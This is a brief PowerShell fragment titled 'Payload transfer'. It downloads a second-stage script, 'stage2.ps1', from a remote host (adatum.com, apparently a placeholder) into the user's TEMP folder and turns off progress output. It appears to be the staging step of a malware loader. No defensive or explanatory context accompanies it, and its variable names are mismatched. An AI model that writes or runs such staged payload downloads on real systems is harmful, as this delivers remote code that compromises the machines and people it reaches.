# Payload transfer
$Stage1Url = 'https://adatum.com:443/stage2.ps1'
$WorkingPath = "$env:TEMP\stage1.bin"
Invoke-WebRequest -Uri $Stage1Url -OutFile $WorkingPath -UseBasicParsing
$ProgressPreference = "SilentlyContinue"
